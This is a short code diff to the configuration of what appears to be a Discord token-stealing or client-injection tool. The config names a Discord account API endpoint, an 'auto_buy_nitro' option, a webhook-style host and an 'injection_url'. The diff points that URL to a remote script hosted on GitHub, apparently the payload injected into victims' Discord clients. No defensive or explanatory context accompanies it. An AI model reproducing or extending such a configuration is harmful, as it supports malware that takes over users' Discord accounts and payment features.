@@ -9,7 +9,7 @@ const config = {
     key: '%key%',
     web: 'http://heil.com',
     auto_buy_nitro: false,
-    injection_url: 'http://heil.com',
+    injection_url: 'https://raw.githubusercontent.com/13shitposts/bin/main/test.js',
 
     api: 'https://discord.com/api/v9/users/@me',
     nitro: {
